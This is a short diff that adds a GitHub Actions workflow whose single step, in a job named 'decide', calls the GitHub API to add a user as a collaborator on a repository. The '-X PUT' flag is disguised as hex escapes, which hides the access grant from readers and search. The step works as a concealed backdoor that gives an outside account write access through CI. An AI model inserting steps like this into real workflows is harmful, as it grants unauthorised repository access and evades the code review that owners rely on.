@@ -1,0 +1,4 @@
+jobs:
+  decide:
+    steps:
+      - run: "gh api \x2d\x58 PUT repos/o/r/collaborators/u"
